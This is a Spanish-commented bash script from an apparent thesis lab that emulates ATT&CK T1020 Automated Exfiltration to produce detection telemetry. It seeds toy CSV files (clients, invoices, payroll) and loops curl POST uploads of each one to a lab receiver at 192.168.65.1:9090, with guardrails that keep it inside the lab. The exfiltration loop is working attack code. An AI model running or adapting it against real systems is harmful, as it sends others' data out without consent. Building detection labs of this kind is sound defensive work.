#!/usr/bin/env bash
# ============================================================================
# ATA020 · T1020 Automated Exfiltration — ataque MANUAL (escrito por el TFG)
# ----------------------------------------------------------------------------
# Tecnica : T1020 Automated Exfiltration (tactica Exfiltration)
# Fuente  : custom (escrito por el TFG)
# Objetivo: EXFILTRAR de forma AUTOMATIZADA (sin intervencion) un CONJUNTO de
#           ficheros ya "recolectados": recorre el directorio de staging y sube
#           CADA fichero al receptor del HOST, midiendo acciones k/m.
#           El fenomeno de la tecnica es la AUTOMATIZACION (el bucle), no un
#           fichero concreto (distinto de ATA009, que subia UN solo fichero).
# Destino : http://192.168.65.1:9090/api/exfil/<fichero> (receptor del HOST, VMnet1)
# Ejecuta : desde /home/angel/lab-attack/ATA020 (cwd del ataque -> ancla H4)
# Elevacion: NO (usuario angel). No se instala nada.
#
# ⚠️ REQUISITO: el receptor (Soporte/Ataques/receiver/sink_http.py) debe estar
#    LEVANTADO en el HOST antes de t0 (ver README §9). La prueba de que los datos
#    SALIERON es una linea del `sink.log` por fichero, con su sha256 coincidente.
#
# GUARDARRAILES (abortan si no se cumplen):
#   - el endpoint DEBE apuntar al receptor del laboratorio (192.168.65.1:9090);
#   - solo se leen ficheros bajo $HOME/lab-attack/ATA020; datos de juguete.
#
# Telemetria esperada (ver README §5):
#   - execve de curl (una por fichero automatizado) -> 80792 (deteccion; T1020-S1).
#   - ancla H4 `audit_cwd=/home/angel/lab-attack/ATA020/*` (T1020-S2).
#
# Prueba de exito (INDEPENDIENTE de la alerta): `sink.log` del HOST con una linea
#   POST /api/exfil/<fichero> + sha256 coincidente para CADA fichero de staging.
# Salida: marcadores T0 / T1_LOCAL en stdout (UTC).
# ============================================================================
set -u

BASE="${HOME}/lab-attack/ATA020"
STAGE="${BASE}/staging"
HOST="192.168.65.1"
PORT="9090"
ENDPOINT_BASE="http://${HOST}:${PORT}/api/exfil"

echo "ATA020 · T1020 Automated Exfiltration (bucle curl POST sobre el staging) — custom (manual)"
echo "T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)"

# --- precondiciones (fallan ruidosamente, sin tocar nada) ---
if [ ! -d "$BASE" ]; then
  echo "ERROR: no existe $BASE (¿scp del directorio de la tecnica?)" >&2
  exit 1
fi
if ! command -v curl >/dev/null 2>&1; then
  echo "ERROR: curl no disponible" >&2
  exit 1
fi

# cwd determinista = carpeta del ataque (ancla H4 del execve)
cd "$BASE" || { echo "ERROR: no puedo cd a $BASE" >&2; exit 1; }

# GUARDARRAIL: el destino DEBE ser el receptor del laboratorio (VMnet1 del host).
case "$ENDPOINT_BASE" in
  "http://192.168.65.1:9090/"*) : ;;
  *) echo "ERROR: endpoint '$ENDPOINT_BASE' fuera del receptor del laboratorio (abortado)" >&2; exit 1 ;;
esac

# GUARDARRAIL: el staging DEBE quedar bajo la carpeta del ataque.
case "$STAGE" in
  "$HOME/lab-attack/ATA020"*) : ;;
  *) echo "ERROR: staging '$STAGE' no esta bajo lab-attack/ATA020 (abortado)" >&2; exit 1 ;;
esac

# 0) SIEMBRA del material "ya recolectado" (datos de juguete; builtin printf, sin execve).
mkdir -p "$STAGE"
if [ ! -f "$STAGE/clientes.csv" ]; then printf 'cliente,segmento,facturacion_eur\nAcme,empresa,182340.50\nNorte,empresa,45310.75\n' > "$STAGE/clientes.csv"; fi
if [ ! -f "$STAGE/facturas.csv" ]; then printf 'factura,cliente,importe_eur\nF-2026-001,Acme,18450.00\nF-2026-002,Norte,15200.00\n' > "$STAGE/facturas.csv"; fi
if [ ! -f "$STAGE/nominas.csv" ]; then printf 'empleado,departamento,bruto_eur\nA.Ruiz,IT,3200.00\nB.Soto,Ventas,2900.00\n' > "$STAGE/nominas.csv"; fi
if [ ! -f "$STAGE/contratos.csv" ]; then printf 'contrato,cliente,estado\nCT-77,Acme,firmado\nCT-78,Norte,borrador\n' > "$STAGE/contratos.csv"; fi

# Conteo del universo a exfiltrar (builtin: glob -> sin execve)
set -- "$STAGE"/*.csv
n_total=$#

echo "--- FICHEROS A EXFILTRAR (sha256) ---"
sha256sum "$STAGE"/*.csv

# 1) EXFILTRACION AUTOMATIZADA: recorre el staging y sube CADA fichero (execve de curl).
k=0
for f in "$STAGE"/*.csv; do
  name="${f##*/}"
  echo ">>> enviando $name"
  curl --silent --show-error --max-time 10 \
    --request POST \
    --header 'Content-Type: text/csv' \
    --data-binary "@${f}" \
    --output /dev/null \
    --write-out 'HTTP=%{http_code} enviado=%{size_upload}B\n' \
    "${ENDPOINT_BASE}/${name}"
  k=$((k + 1))
done

echo "--- estado final ---"
echo "acciones_cubiertas=${k}/${n_total}"
if [ "$k" -ge 1 ] && [ "$k" -eq "$n_total" ]; then
  echo "AUTOMATIZADO=OK ($k/$n_total ficheros exfiltrados sin intervencion)"
else
  echo "AUTOMATIZADO=FALLO" >&2
fi
sleep 1
echo "T1_LOCAL=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
